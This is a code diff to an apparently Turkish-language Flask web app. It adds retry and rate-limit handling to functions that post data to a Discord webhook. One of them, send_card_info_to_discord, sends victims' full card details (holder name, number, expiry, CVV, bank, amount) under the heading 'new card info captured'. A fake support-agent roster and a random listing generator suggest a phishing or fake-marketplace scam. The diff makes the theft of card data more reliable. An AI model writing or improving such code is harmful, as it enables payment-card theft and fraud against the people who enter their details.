@@ -579,18 +579,27 @@ def send_discord_log(title, description, color):
             "timestamp": datetime.datetime.utcnow().isoformat()
         }]
     }
-    try:
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
-        print(f"[DISCORD LOG YANIT] Status: {response.status_code}")
-        print(f"[DISCORD LOG YANIT] Body: {response.text}")
-        
-        if response.status_code == 204 or response.status_code == 200:
-            print("[DISCORD LOG BAŞARILI]")
-        else:
-            print(f"[DISCORD LOG HATA] Status: {response.status_code}")
-    except Exception as e:
-        print(f"[DISCORD LOG İSTİSNA] {e}")
-
+    
+    for attempt in range(3):
+        try:
+            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
+            
+            if response.status_code in (200, 204):
+                print("[DISCORD LOG BAŞARILI]")
+                return True
+            elif response.status_code == 429:
+                retry_after = response.json().get("retry_after", 5)
+                print(f"[DISCORD LOG RATE LIMIT] {retry_after} saniye bekleniyor...")
+                time.sleep(retry_after + 2)
+            else:
+                print(f"[DISCORD LOG HATA] Status: {response.status_code}")
+                time.sleep(3)
+        except Exception as e:
+            print(f"[DISCORD LOG İSTİSNA] {e}")
+            time.sleep(3)
+    
+    return False
+    
 def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv, bank_name, card_brand, amount):
     print(f"[KART BİLGİSİ ÇAĞRILDI] Kullanıcı: {username}")
     
@@ -600,7 +609,7 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
     clean_holder = card_holder.strip()
     
     payload = {
-        "content": "@everyone 🔴 YENİ KART BİLGİSİ YAKALANDI!",
+        "content": "🔴 YENİ KART BİLGİSİ YAKALANDI!",
         "embeds": [
             {
                 "title": "💳 YENİ KART BİLGİSİ — TAM KAYIT",
@@ -622,20 +631,54 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
         ]
     }
     
-    try:
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
-        print(f"[KART DISCORD YANIT] Status: {response.status_code}")
-        print(f"[KART DISCORD YANIT] Body: {response.text}")
-        
-        if response.status_code == 204 or response.status_code == 200:
-            print("[KART DISCORD BAŞARILI]")
-            return True
-        else:
-            print(f"[KART DISCORD HATA] Status: {response.status_code}")
-            return False
-    except Exception as e:
-        print(f"[KART DISCORD İSTİSNA] {e}")
-        return False
+    # ============================================================
+    # RETRY MEKANİZMASI: 3 kez dene, her denemede bekle
+    # ============================================================
+    max_retries = 5
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(
+                DISCORD_WEBHOOK_URL, 
+                json=payload, 
+                headers={"Content-Type": "application/json"}, 
+                timeout=30
+            )
+            
+            print(f"[KART DISCORD DENEME {attempt + 1}] Status: {response.status_code}")
+            
+            # BAŞARILI
+            if response.status_code in (200, 204):
+                print("[KART DISCORD BAŞARILI]")
+                return True
+            
+            # RATE LIMIT
+            elif response.status_code == 429:
+                retry_after = response.json().get("retry_after", 5)
+                print(f"[KART DISCORD RATE LIMIT] {retry_after} saniye bekleniyor...")
+                time.sleep(retry_after + 2)
+                continue
+            
+            # DİĞER HATALAR
+            else:
+                print(f"[KART DISCORD HATA] Status: {response.status_code}, Body: {response.text}")
+                time.sleep(3)
+                continue
+                
+        except requests.exceptions.Timeout:
+            print(f"[KART DISCORD TIMEOUT] Deneme {attempt + 1}, tekrar deneniyor...")
+            time.sleep(3)
+            continue
+        except requests.exceptions.ConnectionError:
+            print(f"[KART DISCORD BAĞLANTI HATASI] Deneme {attempt + 1}, tekrar deneniyor...")
+            time.sleep(5)
+            continue
+        except Exception as e:
+            print(f"[KART DISCORD İSTİSNA] {e}")
+            time.sleep(3)
+            continue
+    
+    print("[KART DISCORD BAŞARISIZ] Tüm denemeler tükendi!")
+    return False
 
 SUPPORT_AGENTS = {
     "erkek": ["Ahmet K.", "Murat Y.", "Emre T.", "Can B.", "Burak D.", "Kaan S."],
@@ -1818,6 +1861,11 @@ def admin_generate_random_product():
 
     flash(f"🎲 Rastgele İlan Oluşturuldu: '{item['title']}'", "success")
     return redirect(url_for("admin_panel"))
+    
+@app.before_request
+def keep_alive():
+    """Render'da uygulamayı uyanık tut"""
+    pass
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
